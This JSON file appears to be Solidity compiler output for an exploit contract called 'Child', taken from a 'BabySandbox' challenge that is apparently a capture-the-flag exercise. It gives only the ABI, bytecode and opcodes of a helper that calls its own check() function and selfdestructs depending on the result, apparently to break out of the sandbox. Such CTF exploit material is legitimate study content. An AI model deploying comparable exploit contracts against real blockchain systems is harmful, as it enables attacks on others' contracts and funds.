{
  "contracts/babysandbox/ExploitBabySandbox.sol": {
    "Child": {
      "abi": [
        {
          "stateMutability": "nonpayable",
          "type": "fallback"
        },
        {
          "inputs": [],
          "name": "check",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        }
      ],
      "evm": {
        "bytecode": {
          "linkReferences": {},
          "object": "60a06040523073ffffffffffffffffffffffffffffffffffffffff1660809073ffffffffffffffffffffffffffffffffffffffff1660601b81525034801561004657600080fd5b5060805160601c61011c61006360003980602e525061011c6000f3fe6080604052348015600f57600080fd5b5060043610602b5760003560e01c8063919840ad1460c557602c565b5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663919840ad6040518163ffffffff1660e01b8152600401600060405180830381600087803b158015609357600080fd5b505af192505050801560a3575060015b60aa5760c3565b3373ffffffffffffffffffffffffffffffffffffffff16ff5b005b60cb60cd565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea26469706673582212209c0377ee8bfa8b1defaf71a01da3715a154dc74eab395160d68838fb074f0d5864736f6c63430007000033",
          "opcodes": "PUSH1 0xA0 PUSH1 0x40 MSTORE ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x80 SWAP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x60 SHL DUP2 MSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x46 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x80 MLOAD PUSH1 0x60 SHR PUSH2 0x11C PUSH2 0x63 PUSH1 0x0 CODECOPY DUP1 PUSH1 0x2E MSTORE POP PUSH2 0x11C PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x919840AD EQ PUSH1 0xC5 JUMPI PUSH1 0x2C JUMP JUMPDEST JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x919840AD PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH1 0x93 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL SWAP3 POP POP POP DUP1 ISZERO PUSH1 0xA3 JUMPI POP PUSH1 0x1 JUMPDEST PUSH1 0xAA JUMPI PUSH1 0xC3 JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST STOP JUMPDEST PUSH1 0xCB PUSH1 0xCD JUMP JUMPDEST STOP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP13 SUB PUSH24 0xEE8BFA8B1DEFAF71A01DA3715A154DC74EAB395160D68838 0xFB SMOD 0x4F 0xD PC PUSH5 0x736F6C6343 STOP SMOD STOP STOP CALLER "
        },
        "methodIdentifiers": {
          "check()": "919840ad"
        }
      }
    }
  }
}